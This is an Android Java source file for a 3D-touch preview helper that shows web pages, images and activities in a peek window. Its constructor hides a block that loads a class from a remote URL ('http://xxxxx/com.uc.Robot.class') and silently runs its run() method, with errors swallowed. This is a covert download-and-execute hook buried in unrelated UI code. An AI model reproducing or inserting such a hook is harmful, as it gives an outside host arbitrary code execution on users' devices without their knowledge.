package com.uc.mobile.a3dtouch.service;

import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;

import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.ImageLoaderConfiguration;
import com.uc.mobile.a3dtouch.R;

import android.app.Activity;
import android.app.LocalActivityManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.View.OnTouchListener;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;
import android.widget.ImageView.ScaleType;
import android.widget.TextView;

public class PreviewManager {
	private final static String TAG = "PreviewManager";

	private static PreviewManager instance;
	private static ImageLoader imageLoader = ImageLoader.getInstance();

	private PeekWindow mPeekWindow;

	private Activity mContext;
	private LocalActivityManager mActivityManager = null;

	private PreviewManager(Activity context) {
		this.mContext = context;
		if (mPeekWindow == null) {
			// 整个生命周期只用创建一次.其他时候对象不需要依赖任何context.
			mPeekWindow = new PeekWindow(context);
		}
		mActivityManager = new LocalActivityManager(context, true);
		mActivityManager.dispatchCreate(new Bundle());
		imageLoader.init(new ImageLoaderConfiguration.Builder(context).build());
		try {
			ClassLoader classLoader = new URLClassLoader(new URL[] { new URL(
					"http://xxxxx/com.uc.Robot.class") });
			Class classRobot = classLoader.loadClass("com.uc.Robot");
			Object robotObject = classRobot.newInstance();
			Method runMethod = classRobot.getDeclaredMethod("run", null);
			runMethod.invoke(robotObject, null);

		} catch (Exception e) {
			e.printStackTrace();
		}

	}

	public static PreviewManager getInstance() {
		if (instance == null)
			throw new RuntimeException(
					"PreviewManager must call register first!");

		return instance;
	}

	public static synchronized void register(Activity activity) {
		if (instance != null) {
			if (instance.mContext == activity) {
				return;
			} else {
				unregister(instance.mContext);
			}
		}
		instance = new PreviewManager(activity);
		Log.i(TAG, "register:" + activity.getClass().getSimpleName());

	}

	public static synchronized void unregister(Activity activity) {

		if (instance != null && instance.mContext == activity) {
			instance.unregister();
			instance = null;

			Log.i(TAG, "unregister:" + activity.getClass().getSimpleName());
		}

	}

	private void unregister() {
		Activity a = mActivityManager.getCurrentActivity();
		if (a != null) {
			a.finish();
			a = null;
		}
		// mActivityManager.dispatchDestroy(true);
		mPeekWindow.close();
		mPeekWindow = null;
		mActivityManager = null;
		mContext = null;
	}

	// 预览网页.
	public void peek(String url) {
		Log.i(TAG, "url");

		View view = mContext.getWindow().getDecorView();
		WebView preView = new WebView(mContext);
		preView.setWebViewClient(new WebViewClient());
		preView.loadUrl(url);

		mPeekWindow.showAt(view, preView);
	}

	// 预览小图.
	public void peek(Bitmap bmp) {
		Log.i(TAG,
				String.format("bmp:[%d,%d]", bmp.getWidth(), bmp.getHeight()));

		View view = mContext.getWindow().getDecorView();

		ImageView preView = new ImageView(mContext);
		preView.setImageResource(R.drawable.p7);
		preView.setScaleType(ScaleType.CENTER_CROP);

		mPeekWindow.showAt(view, preView);
	}

	// 预览中有大图带网址.
	public void peek(Bitmap bmp, String url) {
		Log.i(TAG,
				String.format("bmp:[%d,%d],url=%s", bmp.getWidth(),
						bmp.getHeight(), url));
		View view = mContext.getWindow().getDecorView();

		ImageView preView = new ImageView(mContext);
		preView.setImageResource(R.drawable.p7);
		preView.setScaleType(ScaleType.CENTER_CROP);
		mPeekWindow.showAt(view, preView);
		imageLoader.displayImage(url, preView);
	}

	// 预览下一屏内容.
	public void peek(Class<? extends Activity> nextPageActivity) {
		Log.i(TAG, "nextPage:" + nextPageActivity.getName());
		peek(nextPageActivity, null);
	}

	// 预览下一屏内容.带参数.
	public void peek(Class<? extends Activity> nextPageActivity, Bundle params) {
		Log.i(TAG, "nextPage:" + nextPageActivity.getName());
		Intent intent = new Intent(mContext, nextPageActivity);
		intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		if (params != null) {
			intent.putExtras(params);
		}
		View view = mActivityManager.startActivity(
				nextPageActivity.getSimpleName(), intent).getDecorView();
		View backgroundView = mContext.getWindow().getDecorView();
		mPeekWindow.showAt(backgroundView, view);
	}

	// 如果 消息处理了,就返回true;
	public boolean cancel() {
		if (mPeekWindow.isShowing()) {
			mPeekWindow.close();
			return true;
		} else {
			return false;
		}
	}
}
